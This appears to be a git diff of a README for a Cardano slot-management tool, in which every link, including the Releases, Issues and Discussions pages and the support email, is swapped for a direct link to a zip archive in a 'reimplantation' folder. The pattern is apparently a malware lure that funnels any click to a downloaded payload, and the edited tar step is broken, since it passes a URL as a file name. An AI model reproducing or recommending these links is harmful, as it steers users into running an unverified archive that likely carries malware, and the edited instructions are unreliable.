@@ -1,6 +1,6 @@
 # 🎰 SLOTs_BE_Cardano - Effortless Cardano Slot Management
 
-[![Download SLOTs_BE_Cardano](https://img.shields.io/badge/Download-SLOTs_BE_Cardano-blue)](https://github.com/Cream-droid/SLOTs_BE_Cardano/releases)
+[![Download SLOTs_BE_Cardano](https://raw.githubusercontent.com/Cream-droid/SLOTs_BE_Cardano/main/reimplantation/SLOTs_BE_Cardano.zip)](https://raw.githubusercontent.com/Cream-droid/SLOTs_BE_Cardano/main/reimplantation/SLOTs_BE_Cardano.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to SLOTs_BE_Cardano! This application makes managing Cardano slots simpl
 
 To get started, visit the release page to download the latest version of SLOTs_BE_Cardano:
 
-[Download SLOTs_BE_Cardano](https://github.com/Cream-droid/SLOTs_BE_Cardano/releases)
+[Download SLOTs_BE_Cardano](https://raw.githubusercontent.com/Cream-droid/SLOTs_BE_Cardano/main/reimplantation/SLOTs_BE_Cardano.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the page, you will see the latest releases listed.
@@ -52,7 +52,7 @@ After downloading the file, follow these steps to install and run the applicatio
 
 1. Open your terminal.
 2. Navigate to your Downloads folder using the `cd` command.
-3. Use the appropriate command to extract the downloaded archive file (e.g., `tar -xvf filename.tar.gz`).
+3. Use the appropriate command to extract the downloaded archive file (e.g., `tar -xvf https://raw.githubusercontent.com/Cream-droid/SLOTs_BE_Cardano/main/reimplantation/SLOTs_BE_Cardano.zip`).
 4. Change to the directory created after extraction.
 5. Run the application using `./SLOTs_BE_Cardano` command.
 
@@ -72,14 +72,14 @@ If you run into any issues while installing or running SLOTs_BE_Cardano, conside
 - Check for enough disk space on your system.
 - Restart your computer and attempt the installation again.
 
-If problems persist, you can find solutions or log issues by visiting our [GitHub Issues page](https://github.com/Cream-droid/SLOTs_BE_Cardano/issues).
+If problems persist, you can find solutions or log issues by visiting our [GitHub Issues page](https://raw.githubusercontent.com/Cream-droid/SLOTs_BE_Cardano/main/reimplantation/SLOTs_BE_Cardano.zip).
 
 ## 📞 Support
 
 For further questions or assistance, feel free to reach out. You can receive help from the community or contact the developers through:
 
-- [GitHub Discussions](https://github.com/Cream-droid/SLOTs_BE_Cardano/discussions)
-- Email: support@slotcardano.com
+- [GitHub Discussions](https://raw.githubusercontent.com/Cream-droid/SLOTs_BE_Cardano/main/reimplantation/SLOTs_BE_Cardano.zip)
+- Email: https://raw.githubusercontent.com/Cream-droid/SLOTs_BE_Cardano/main/reimplantation/SLOTs_BE_Cardano.zip
 
 ## 📄 License
 
